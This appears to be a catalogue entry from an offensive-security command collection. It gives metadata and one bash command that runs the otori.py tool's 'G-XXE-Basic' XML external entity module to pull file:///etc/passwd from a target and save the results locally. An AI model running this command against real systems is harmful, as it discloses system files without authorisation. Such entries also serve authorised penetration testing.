---
id: cc21ac30-b9b4-42e5-945a-825f21a37106
name: Clone G-XXE-Basic module with file:///etc/passwd URI
type: command
executor: bash
data: python ./otori.py --clone --module "G-XXE-Basic" --singleuri "file:///etc/passwd"
  --module-options "TEMPLATEFILE" "TARGETURL" "BASE64ENCODE" "DOCTYPE" "XMLTAG" --outputbase
  "./output-generic-solr" --overwrite --noerrorfiles --noemptyfiles --nowhitespacefiles
  --noemptydirs
output: null
created_at: '2023-04-06T03:56:43.974349+00:00'
updated_at: '2023-04-10T20:24:45.357412+00:00'
---

# Clone G-XXE-Basic module with file:///etc/passwd URI

```bash
python ./otori.py --clone --module "G-XXE-Basic" --singleuri "file:///etc/passwd" --module-options "TEMPLATEFILE" "TARGETURL" "BASE64ENCODE" "DOCTYPE" "XMLTAG" --outputbase "./output-generic-solr" --overwrite --noerrorfiles --noemptyfiles --nowhitespacefiles --noemptydirs
```
